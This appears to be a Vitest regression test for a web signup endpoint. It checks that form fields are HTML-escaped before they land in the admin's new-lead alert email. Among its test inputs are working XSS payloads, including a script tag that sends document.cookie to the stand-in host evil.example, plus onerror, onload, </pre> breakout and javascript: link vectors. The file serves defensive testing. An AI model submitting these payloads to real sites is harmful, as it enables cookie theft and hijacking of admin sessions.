/**
 * POST /api/prospects (the public /qualify self-serve signup form) -- admin-
 * alert HTML injection via unescaped body fields.
 *
 * No auth, rate-limited only. Every field folded into the "New lead from
 * /qualify" admin-alert email's `summary` was interpolated raw into a <pre>
 * block with zero escaping -- same bug class as lead/route.ts's job-
 * application admin email (fixed in this same round). Confirmed exploitable:
 * a crafted business_name/owner_name/etc. lands unescaped in the HTML email
 * the platform admin opens for every new signup.
 */
import { describe, it, expect, beforeEach, vi } from 'vitest'

let capturedHtml = ''
let capturedSubject = ''

vi.mock('@/lib/rate-limit-db', () => ({ rateLimitDb: vi.fn(async () => ({ allowed: true, remaining: 2 })) }))
vi.mock('@/lib/lead-fit', () => ({ computeFit: vi.fn(() => ({ score: 50, bucket: 'warm' })) }))
vi.mock('@/lib/email', () => ({
  sendEmail: vi.fn(async (opts: { to: string; subject: string; html: string }) => {
    capturedSubject = opts.subject
    capturedHtml = opts.html
  }),
}))

vi.mock('@/lib/supabase', () => ({
  supabaseAdmin: {
    from: () => ({
      select: () => ({
        eq: () => ({
          eq: () => ({
            in: () => ({
              limit: async () => ({ data: [], error: null }),
            }),
          }),
        }),
      }),
      insert: () => ({
        select: () => ({
          single: async () => ({ data: { id: 'prospect-1', slot_taken_at_submit: false }, error: null }),
        }),
        then: (resolve: (v: unknown) => void) => resolve({ error: null }),
      }),
    }),
  },
}))

import { POST } from './route'

function qualifyReq(overrides: Record<string, unknown> = {}): Request {
  const body = {
    business_name: 'Acme Cleaning',
    owner_name: 'Jane Doe',
    owner_email: 'jane@example.com',
    trade: 'cleaning',
    ...overrides,
  }
  return new Request('https://homeservicesbusinesscrm.com/api/prospects', {
    method: 'POST',
    headers: { 'content-type': 'application/json', 'x-forwarded-for': '203.0.113.10' },
    body: JSON.stringify(body),
  })
}

describe('POST /api/prospects — admin-alert email HTML escaping', () => {
  beforeEach(() => {
    capturedHtml = ''
    capturedSubject = ''
    process.env.ADMIN_NOTIFICATION_EMAIL = 'admin@fullloopcrm.com'
  })

  it('escapes an HTML-injection payload in business_name/owner_name before it reaches the admin alert', async () => {
    const res = await POST(qualifyReq({
      business_name: '<img src=x onerror=alert(document.cookie)>',
      owner_name: '<script>fetch("https://evil.example/steal?c="+document.cookie)</script>',
    }))
    expect(res.status).toBe(200)
    expect(capturedHtml).not.toContain('<img src=x onerror=')
    expect(capturedHtml).not.toContain('<script>fetch(')
    expect(capturedHtml).toContain('&lt;img src=x onerror=')
    expect(capturedHtml).toContain('&lt;script&gt;fetch(')
  })

  it('escapes an HTML-injection payload in owner_phone/tier_interest/launch_timeline', async () => {
    const res = await POST(qualifyReq({
      owner_phone: '"><svg onload=alert(1)>',
      tier_interest: '</pre><script>alert(1)</script>',
      launch_timeline: '<a href="javascript:alert(1)">click</a>',
    }))
    expect(res.status).toBe(200)
    expect(capturedHtml).not.toContain('"><svg onload=alert(1)>')
    expect(capturedHtml).not.toContain('</pre><script>alert(1)</script>')
    expect(capturedHtml).not.toContain('<a href="javascript:alert(1)">click</a>')
  })

  it('CONTROL: benign field values still render legibly in the admin alert', async () => {
    const res = await POST(qualifyReq({ business_name: "Bob's Plumbing & Sons" }))
    expect(res.status).toBe(200)
    expect(capturedSubject).toContain("Bob's Plumbing & Sons")
    expect(capturedHtml).toContain('Bob&#39;s Plumbing &amp; Sons')
  })
})
